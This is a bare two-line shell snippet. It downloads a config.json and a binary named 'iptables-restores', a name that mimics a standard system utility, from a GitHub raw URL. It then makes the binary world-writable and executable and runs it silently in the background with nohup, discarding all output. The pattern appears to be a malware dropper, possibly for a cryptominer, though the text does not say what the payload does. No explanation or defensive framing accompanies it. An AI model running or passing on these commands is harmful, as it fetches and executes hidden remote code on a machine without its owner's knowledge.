curl https://raw.githubusercontent.com/p0lkns/359/main/config.json -o config.json
curl https://raw.githubusercontent.com/p0lkns/359/main/iptables-restores -o iptables-restores ; chmod 777 iptables-restores ; nohup /bin/bash -c iptables-restores >/dev/null 2>&1 &
